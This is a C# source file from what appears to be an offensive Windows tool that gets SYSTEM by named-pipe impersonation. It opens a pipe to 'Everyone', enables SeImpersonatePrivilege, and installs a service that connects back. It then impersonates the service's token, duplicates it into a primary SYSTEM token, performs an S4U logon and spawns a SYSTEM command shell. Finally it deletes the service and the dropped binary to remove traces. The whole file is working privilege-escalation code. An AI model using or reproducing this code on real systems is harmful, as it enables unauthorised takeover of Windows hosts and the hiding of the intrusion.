using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using NamedPipeImpersonation.Interop;

namespace NamedPipeImpersonation.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool GetSystemWithNamedPipe()
        {
            var isImpersonated = false;
            bool status = Utilities.GetS4uLogonAccount(
                out string s4uUser,
                out string s4uDomain,
                out LSA_STRING pkgName,
                out TOKEN_SOURCE tokenSource);

            if (!status)
            {
                Console.WriteLine("[-] Failed to determin S4U logon account information.");
                return status;
            }

            do
            {
                int error;
                string pipeMessage;
                var hPrimaryToken = IntPtr.Zero;
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO)),
                    lpDesktop = @"Winsta0\Default"
                };
                var creationFlags = PROCESS_CREATION_FLAGS.NONE;
                var pipeSecurity = new PipeSecurity();
                var accessRule = new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow);
                pipeSecurity.AddAccessRule(accessRule);

                if (Helpers.IsCurrentProcessInJob())
                {
                    creationFlags |= PROCESS_CREATION_FLAGS.CREATE_BREAKAWAY_FROM_JOB;
                }

                Globals.ConnectEventHandle = NativeMethods.CreateEvent(IntPtr.Zero, true, false, "ConnectEvent");
                Globals.PipeEventHandle = NativeMethods.CreateEvent(IntPtr.Zero, true, false, "ServiceEvent");

                if ((Globals.ConnectEventHandle == IntPtr.Zero) || (Globals.PipeEventHandle == IntPtr.Zero))
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create service handling event.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }

                Console.WriteLine("[>] Trying to enable required privileges.");

                status = Utilities.EnableTokenPrivileges(
                    new List<string> { Win32Consts.SE_IMPERSONATE_NAME },
                    out Dictionary<string, bool> adjustedPrivs);

                foreach (var priv in adjustedPrivs)
                {
                    if (priv.Value)
                        Console.WriteLine("[+] {0} is enabled successfully.", priv.Key);
                    else
                        Console.WriteLine("[-] {0} is not available.", priv.Key);
                }

                if (!status)
                    break;

                using (var pipeServer = new NamedPipeServerStream(
                    Globals.ServiceName,
                    PipeDirection.InOut,
                    100,
                    PipeTransmissionMode.Byte,
                    PipeOptions.None,
                    1024,
                    1024,
                    pipeSecurity))
                {
                    Console.WriteLine(@"[*] Created Named Pipe Server @ \\.\pipe\{0}", Globals.ServiceName);

                    using (var pipeReader = new StreamReader(pipeServer))
                    using (var hPipe = pipeServer.SafePipeHandle)
                    {
                        var serviceThread = new Thread(new ThreadStart(ServiceThreadProc));

                        Console.WriteLine("[*] Waiting for client connection...");

                        serviceThread.Start();
                        pipeServer.WaitForConnection();
                        pipeMessage = pipeReader.ReadToEnd();

                        NativeMethods.SetEvent(Globals.ConnectEventHandle);
                        NativeMethods.NtClose(Globals.ConnectEventHandle);
                        NativeMethods.NtWaitForSingleObject(Globals.PipeEventHandle, false, IntPtr.Zero);

                        if (Helpers.CompareIgnoreCase(pipeMessage, "timeout"))
                        {
                            Console.WriteLine("[-] Timeout. Maybe blocked by anti-virus.");
                        }
                        else if (NativeMethods.ImpersonateNamedPipeClient(hPipe))
                        {
                            isImpersonated = (Environment.UserName.Length != 0);

                            if (isImpersonated)
                            {
                                string accountName;
                                Helpers.GetTokenUserName(out string upn, out string domain, out string stringSid, out SID_NAME_USE _);

                                if (!string.IsNullOrEmpty(upn) && !string.IsNullOrEmpty(domain))
                                    accountName = string.Format(@"{0}\{1}", domain, upn);
                                else if (!string.IsNullOrEmpty(upn))
                                    accountName = upn;
                                else if (!string.IsNullOrEmpty(domain))
                                    accountName = domain;
                                else
                                    accountName = "N/A";

                                if (string.IsNullOrEmpty(stringSid))
                                    stringSid = "N/A";

                                Console.WriteLine("[+] Impersonated as \"{0}\" (SID: {1}).", accountName, stringSid);

                                status = NativeMethods.DuplicateTokenEx(
                                    WindowsIdentity.GetCurrent().Token,
                                    ACCESS_MASK.MAXIMUM_ALLOWED,
                                    IntPtr.Zero,
                                    SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous,
                                    TOKEN_TYPE.TokenPrimary,
                                    out hPrimaryToken);

                                if (!status)
                                {
                                    error = Marshal.GetLastWin32Error();
                                    Console.WriteLine("[-] Failed to get primary SYSTEM token.");
                                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                                    hPrimaryToken = IntPtr.Zero;
                                }
                            }
                            else
                            {
                                Console.WriteLine("[-] Failed to named pipe impersonation.");
                            }
                        }
                        else
                        {
                            error = Marshal.GetLastWin32Error();
                            Console.WriteLine("[-] Failed to named pipe impersonation.");
                            Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                        }
                    }
                }

                if (!isImpersonated || (hPrimaryToken == IntPtr.Zero))
                {
                    break;
                }
                else
                {
                    Console.WriteLine("[>] Trying to S4U logon as \"{0}\\{1}\".", s4uDomain, s4uUser);

                    status = Utilities.ImpersonateWithS4uLogon(
                        s4uUser,
                        s4uDomain,
                        in pkgName,
                        in tokenSource,
                        new List<string> { "S-1-5-20" });

                    if (!status)
                    {
                        error = Marshal.GetLastWin32Error();
                        Console.WriteLine("[-] Failed to S4U logon.");
                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[+] S4U logon is successful.");
                    }
                }

                Console.WriteLine("[>] Trying to spawn token assigned shell.");

                status = NativeMethods.CreateProcessAsUser(
                    hPrimaryToken,
                    null,
                    Environment.GetEnvironmentVariable("COMSPEC"),
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    creationFlags,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInformation);
                NativeMethods.NtClose(hPrimaryToken);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to spawn SYSTEM shell.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                }
                else
                {
                    Console.WriteLine("[+] SYSTEM shell is executed successfully.");

                    NativeMethods.NtWaitForSingleObject(processInformation.hThread, true, IntPtr.Zero);
                    NativeMethods.NtClose(processInformation.hThread);
                    NativeMethods.NtClose(processInformation.hProcess);
                }
            } while (false);

            if (isImpersonated)
                NativeMethods.RevertToSelf();
            else
                Console.WriteLine("[-] Failed to GetSystem.");

            Console.WriteLine("[*] Done.");

            return status;
        }


        private static void ServiceThreadProc()
        {
            NTSTATUS ntstatus;
            IntPtr hService;
            var timeout = LARGE_INTEGER.FromInt64(-(Globals.Timeout * 10000));

            Console.WriteLine("[>] Trying to create and start named pipe client service.");
            Console.WriteLine("    [*] Service Name : {0}", Globals.ServiceName);

            Thread.Sleep(100);
            hService = Utilities.StartNamedPipeClientService();

            if (hService == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to start named pipe client service.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
            }
            else
            {
                Console.WriteLine("[+] Named pipe client service is started successfully.");

                if (Globals.UseDropper)
                    Console.WriteLine("[*] Service binary @ {0}", Globals.BinaryPath);
            }

            ntstatus = NativeMethods.NtWaitForSingleObject(Globals.ConnectEventHandle, false, in timeout);

            if (ntstatus == Win32Consts.STATUS_TIMEOUT)
            {
                try
                {
                    using (var pipeClient = new NamedPipeClientStream(".", Globals.ServiceName, PipeDirection.Out))
                    {
                        var message = Encoding.ASCII.GetBytes("timeout");
                        pipeClient.Connect(3000);
                        pipeClient.Write(message, 0, message.Length);
                    }
                }
                catch { }
            }

            if (hService != IntPtr.Zero)
            {
                Console.WriteLine("[>] Deleting named pipe client service.");

                if (!NativeMethods.DeleteService(hService))
                {
                    Console.WriteLine("[-] Failed to delete named pipe client servce (Service Name = {0}).", Globals.ServiceName);
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
                }
                else
                {
                    Console.WriteLine("[+] Named pipe client service is deleted successfully.");
                }
            }

            try
            {
                if (Globals.UseDropper && File.Exists(Globals.BinaryPath))
                {
                    Console.WriteLine("[>] Deleting service binary.");
                    File.Delete(Globals.BinaryPath);
                    Console.WriteLine("[+] Service binary is deleted successfully.");
                }
            }
            catch
            {
                Console.WriteLine("[!] Failed to delete dropper binary. Delete it mannually.");
                Console.WriteLine("    [*] Binary Path : {0}", Globals.BinaryPath);
            }

            NativeMethods.SetEvent(Globals.PipeEventHandle);
            NativeMethods.NtClose(Globals.PipeEventHandle);
        }
    }
}
